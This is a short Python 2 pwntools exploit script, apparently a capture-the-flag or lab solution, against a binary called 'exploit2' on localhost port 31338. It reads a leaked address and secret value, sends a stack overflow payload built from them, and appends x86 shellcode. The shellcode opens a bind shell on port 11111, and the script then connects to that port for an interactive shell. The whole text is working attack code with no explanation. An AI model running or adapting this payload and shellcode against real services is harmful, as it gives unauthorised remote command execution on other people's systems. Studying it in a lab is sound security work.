from pwn import *
from libformatstr import FormatStr
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

elf = 'exploit2'
libc = '/usr/lib32/libc.so.6'
bin = ELF(elf)

local = 0 

if local:
        cn = process(elf)
        libc = ELF(libc)
else:
        cn = remote('localhost', 31338)

shellcode  = shellcode = ''.join(["\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a",
                     "\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68",
                     "\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1",
                     "\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd",
                     "\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f",
                     "\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f",
                     "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3",
                     "\x41\xcd\x80",])

#plt_ = bin.plt['']
#got_ = bin.got[''] 
#addr_ = bin.symbols['']

canary = cn.recvuntil("here:")
addr_secret = u32(canary[:4].ljust(4,'\0'))
secret = u32(canary[4:8].ljust(4,'\0'))
print hex(addr_secret)
print hex(secret)
pay =p32(secret)*516 +p32(addr_secret+0x814) + shellcode 
raw_input()
cn.sendline(pay)

cn = remote('localhost',11111)

cn.interactive()
